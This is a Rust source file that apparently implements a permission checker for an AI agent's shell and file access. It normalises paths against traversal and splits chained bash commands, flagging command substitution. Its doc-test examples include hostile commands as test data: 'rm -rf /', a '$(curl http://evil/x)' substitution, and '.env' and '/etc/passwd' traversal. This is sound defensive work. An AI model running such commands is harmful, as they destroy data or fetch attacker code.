/// Normalize a path for permission matching by collapsing `.`, `..`, and duplicate slashes.
///
/// This prevents path traversal attacks like `src/../.env` from bypassing file permission rules.
/// The function does NOT resolve symlinks or expand `~` (no filesystem access).
///
/// # Algorithm
///
/// 1. Split path on `/`
/// 2. Process each component:
///    - `.` → skip (current directory)
///    - `..` → pop from result stack if non-empty (parent directory)
///    - Other → push to result stack
/// 3. Rejoin with `/`
/// 4. Remove trailing slashes
///
/// # Examples
///
/// ```
/// # use crucible_core::config::components::permissions::normalize_path_for_matching;
/// assert_eq!(normalize_path_for_matching("src/../.env"), ".env");
/// assert_eq!(normalize_path_for_matching("src/./main.rs"), "src/main.rs");
/// assert_eq!(normalize_path_for_matching("src//deep///file.rs"), "src/deep/file.rs");
/// assert_eq!(normalize_path_for_matching("src/deep/"), "src/deep");
/// assert_eq!(normalize_path_for_matching("~/Documents/"), "~/Documents");
/// assert_eq!(normalize_path_for_matching("a/b/../../c"), "c");
/// assert_eq!(normalize_path_for_matching("../../etc/passwd"), "../../etc/passwd");
/// assert_eq!(normalize_path_for_matching(""), "");
/// ```
///
/// # Security Note
///
/// For permission matching, apply normalization to BOTH the rule pattern and the input path,
/// then use the most restrictive result: if either the raw path OR the normalized path matches
/// a deny rule, deny the operation.
pub fn normalize_path_for_matching(path: &str) -> String {
    if path.is_empty() {
        return String::new();
    }

    let is_absolute = path.starts_with('/');
    let mut result: Vec<&str> = Vec::new();

    for component in path.split('/') {
        match component {
            "" | "." => {
                // Empty (from double slashes) or current dir → skip
            }
            ".." => {
                if let Some(last) = result.last() {
                    if *last != ".." {
                        result.pop();
                    } else if !is_absolute {
                        result.push("..");
                    }
                } else if !is_absolute {
                    result.push("..");
                }
            }
            other => {
                // Regular component → push
                result.push(other);
            }
        }
    }

    let normalized = result.join("/").trim_end_matches('/').to_string();
    if is_absolute {
        if normalized.is_empty() {
            "/".to_string()
        } else {
            format!("/{normalized}")
        }
    } else {
        normalized
    }
}

/// Split a bash command string on operators (`&&`, `||`, `;`, `|`, `&`) and newlines while
/// respecting quoted strings and backslash escapes.
///
/// This function splits chained bash commands so the permission engine can evaluate each
/// sub-command independently. It handles double-quoted and single-quoted strings, ensuring
/// operators inside quotes are not treated as delimiters.
///
/// # Arguments
/// * `input` - A bash command string, possibly containing multiple chained commands
///
/// # Returns
/// A vector of borrowed string slices, each representing a single command. Each slice is
/// trimmed of leading/trailing whitespace. Empty segments (e.g., from trailing semicolons)
/// are filtered out.
///
/// # Examples
/// ```
/// use crucible_core::config::components::permissions::split_chained_commands;
///
/// // Basic chaining
/// assert_eq!(
///     split_chained_commands("cargo test && rm -rf /"),
///     vec!["cargo test", "rm -rf /"]
/// );
///
/// // Single command (no split)
/// assert_eq!(
///     split_chained_commands("cargo test"),
///     vec!["cargo test"]
/// );
///
/// // Quoted strings (no split inside quotes)
/// assert_eq!(
///     split_chained_commands("echo \"hello && world\""),
///     vec!["echo \"hello && world\""]
/// );
///
/// // Single-quoted strings
/// assert_eq!(
///     split_chained_commands("echo 'hello && world'"),
///     vec!["echo 'hello && world'"]
/// );
///
/// // Multiple operators
/// assert_eq!(
///     split_chained_commands("a && b || c; d | e"),
///     vec!["a", "b", "c", "d", "e"]
/// );
///
/// // A bare `&` backgrounds the command before it, so it separates like `;`
/// assert_eq!(
///     split_chained_commands("git status & rm -rf /tmp/x"),
///     vec!["git status", "rm -rf /tmp/x"]
/// );
///
/// // …but the `&` of a redirection belongs to the redirect, not to a boundary
/// assert_eq!(
///     split_chained_commands("cargo test 2>&1"),
///     vec!["cargo test 2>&1"]
/// );
///
/// // Backslash escapes are honoured, so an escaped quote does not open a string
/// assert_eq!(
///     split_chained_commands(r#"echo "\"" && rm -rf /tmp/x"#),
///     vec![r#"echo "\"""#, "rm -rf /tmp/x"]
/// );
///
/// // Trailing semicolon (filtered out)
/// assert_eq!(
///     split_chained_commands("cmd;"),
///     vec!["cmd"]
/// );
///
/// // Empty input
/// assert_eq!(
///     split_chained_commands(""),
///     vec![] as Vec<&str>
/// );
/// ```
///
/// # Limitations
/// - Does not handle `$(...)` or backtick substitution, `<(...)`/`>(...)` process
///   substitution, or heredocs. Those hide a command from the splitter entirely, which is why
///   permission evaluation does not rely on this function alone — see [`split_command_line`],
///   which reports them so the decision can fall to the configured default instead of to the
///   leading command's rule.
/// - Does not model redirection targets: `echo hi > file` is one `echo` command here, and an
///   `allow` rule for `echo` therefore permits the write.
///
/// # Security Note
/// This function is used for permission checking. Each sub-command is evaluated independently,
/// so `cargo test && rm -rf /` will check both `cargo test` and `rm -rf /` separately.
pub fn split_chained_commands(input: &str) -> Vec<&str> {
    split_command_line(input).segments
}

/// A shell construct [`split_command_line`] cannot model.
///
/// Each of these can introduce a command the splitter never sees, so the segments it did find
/// are an incomplete view of what will run and the leading command's `allow` rule must not
/// decide the line.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum UnmodellableConstruct {
    /// Backtick command substitution — ``git log `curl evil` ``.
    BacktickSubstitution,
    /// `$(...)` command substitution. `$((` arithmetic expansion is reported here too: it
    /// can nest a substitution, and distinguishing the two buys nothing in a security gate.
    CommandSubstitution,
    /// `<(...)` or `>(...)` process substitution.
    ProcessSubstitution,
    /// A quote that never closed, so everything the scan did past it is guesswork.
    UnterminatedQuote,
}

impl UnmodellableConstruct {
    /// Short human-readable name, used in permission decision reasons.
    pub fn describe(self) -> &'static str {
        match self {
            Self::BacktickSubstitution => "backtick command substitution",
            Self::CommandSubstitution => "`$(...)` command substitution",
            Self::ProcessSubstitution => "process substitution",
            Self::UnterminatedQuote => "an unterminated quote",
        }
    }
}

/// The result of splitting a bash command line for permission evaluation.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandLineSplit<'a> {
    /// The statements the splitter identified, whitespace-trimmed, empties dropped.
    pub segments: Vec<&'a str>,
    /// The first construct that made the split untrustworthy, if any.
    pub unmodellable: Option<UnmodellableConstruct>,
}

/// Split a bash command line into statements, reporting any construct that makes the split
/// untrustworthy.
///
/// This is the form the permission engine uses; [`split_chained_commands`] is the same scan
/// with the report discarded. Reporting rather than guessing is what lets an unrecognised
/// construct fall to the configured default instead of inheriting whichever command happens
/// to be leftmost — the difference between `Ask` and a silent `Allow`.
///
/// # Examples
/// ```
/// use crucible_core::config::components::permissions::{
///     split_command_line, UnmodellableConstruct,
/// };
///
/// let split = split_command_line("git log $(curl http://evil/x)");
/// assert_eq!(
///     split.unmodellable,
///     Some(UnmodellableConstruct::CommandSubstitution)
/// );
///
/// // Single quotes suppress substitution, so this line is fully modelled.
/// let split = split_command_line("echo '$(date)'");
/// assert_eq!(split.unmodellable, None);
/// assert_eq!(split.segments, vec!["echo '$(date)'"]);
///
/// // Redirection hides no command and is deliberately not reported.
/// assert_eq!(split_command_line("echo hi > /tmp/x").unmodellable, None);
/// ```
pub fn split_command_line(input: &str) -> CommandLineSplit<'_> {
    if input.is_empty() {
        return CommandLineSplit {
            segments: Vec::new(),
            unmodellable: None,
        };
    }

    let bytes = input.as_bytes();
    let mut segments = Vec::new();
    let mut unmodellable = None;
    let mut current_start = 0;
    let mut in_double_quote = false;
    let mut in_single_quote = false;
    let mut i = 0;

    while i < bytes.len() {
        let ch = bytes[i];

        // POSIX gives `\` no special meaning inside single quotes; everywhere else it
        // escapes the next byte. Consuming both bytes is what stops `echo "\""` from
        // leaving the scanner stuck inside a string, which used to silence every operator
        // for the rest of the line. Skipping a lead byte of a multi-byte character is
        // harmless: continuation bytes are >= 0x80 and match no ASCII operator.
        if ch == b'\\' && !in_single_quote {
            // `\` + newline is a line continuation rather than an escape: bash deletes both
            // and joins the lines. Ending the statement here is what keeps those two bytes
            // out of the next segment's text, where a leading `\` is enough to stop a
            // `deny` glob matching the command that follows. Inside double quotes the
            // continuation is part of one word, so there it is only consumed.
            if bytes.get(i + 1) == Some(&b'\n') && !in_double_quote {
                let segment = input[current_start..i].trim();
                if !segment.is_empty() {
                    segments.push(segment);
                }
                current_start = i + 2;
            }

            i += 2;
            continue;
        }

        // Handle quote state
        if ch == b'"' && !in_single_quote {
            in_double_quote = !in_double_quote;
            i += 1;
            continue;
        }

        if ch == b'\x27' && !in_double_quote {
            in_single_quote = !in_single_quote;
            i += 1;
            continue;
        }

        // Substitution is performed inside double quotes as well, so it counts there;
        // single quotes suppress it entirely. Only the first find is kept — one
        // unmodellable construct already forces the fallback.
        if !in_single_quote && unmodellable.is_none() {
            unmodellable = substitution_at(bytes, i, in_double_quote);
        }

        // If inside quotes, skip operator detection
        if in_double_quote || in_single_quote {
            i += 1;
            continue;
        }

        // Check for operators (only when not in quotes)
        let is_operator = if i + 1 < bytes.len() {
            // Two-character operators: &&, ||
            (ch == b'&' && bytes[i + 1] == b'&') || (ch == b'|' && bytes[i + 1] == b'|')
        } else {
            false
        };

        if is_operator {
            // Found && or ||
            let segment = input[current_start..i].trim();
            if !segment.is_empty() {
                segments.push(segment);
            }
            current_start = i + 2;
            i += 2;
        } else if ch == b';'
            || ch == b'|'
            || ch == b'\n'
            || (ch == b'&' && is_background_operator(bytes, i))
        {
            // Single-character operators: ;, |, &, or newline. A newline separates shell
            // statements exactly like `;`, so leaving it unsplit would let
            // `git log\ncurl ...` ride a `git` whitelist entry, and a bare `&` backgrounds
            // the command before it and then runs the next one just the same. (`\r` in
            // CRLF input is stripped by the trim below.)
            let segment = input[current_start..i].trim();
            if !segment.is_empty() {
                segments.push(segment);
            }
            current_start = i + 1;
            i += 1;
        } else {
            i += 1;
        }
    }

    // Add the final segment
    let segment = input[current_start..].trim();
    if !segment.is_empty() {
        segments.push(segment);
    }

    // Ending inside a quote means the scan never found the closing delimiter, so every
    // operator it did or did not see after that point is unreliable.
    if (in_double_quote || in_single_quote) && unmodellable.is_none() {
        unmodellable = Some(UnmodellableConstruct::UnterminatedQuote);
    }

    CommandLineSplit {
        segments,
        unmodellable,
    }
}

/// Whether the `&` at `i` ends a statement rather than belonging to a redirection.
///
/// A bare `&` backgrounds the preceding command and lets the next one run, exactly like `;`.
/// The exceptions are `&>file` / `&>>file` (redirect both streams) and the adjacent
/// `>&`/`<&` file-descriptor duplications such as `2>&1`, where splitting would cut a single
/// command in half.
fn is_background_operator(bytes: &[u8], i: usize) -> bool {
    if bytes.get(i + 1) == Some(&b'>') {
        return false;
    }

    !(i > 0 && matches!(bytes[i - 1], b'>' | b'<'))
}

/// Identify a command-hiding substitution starting at `i`, if any.
///
/// `>`/`>>` redirection is deliberately absent: it introduces no second command, and
/// reporting it would make the fallback fire on `2>&1`, `> /dev/null` and every other
/// ordinary redirect. The cost of that omission — an `allow` rule does not constrain where
/// the allowed command writes — is recorded in `docs/Help/Concepts/Permission Precedence.md`
/// under "What a `bash:` rule covers".
fn substitution_at(bytes: &[u8], i: usize, in_double_quote: bool) -> Option<UnmodellableConstruct> {
    match bytes[i] {
        b'`' => Some(UnmodellableConstruct::BacktickSubstitution),
        b'$' if bytes.get(i + 1) == Some(&b'(') => Some(UnmodellableConstruct::CommandSubstitution),
        // Process substitution is not performed inside quotes at all.
        b'<' | b'>' if !in_double_quote && bytes.get(i + 1) == Some(&b'(') => {
            Some(UnmodellableConstruct::ProcessSubstitution)
        }
        _ => None,
    }
}
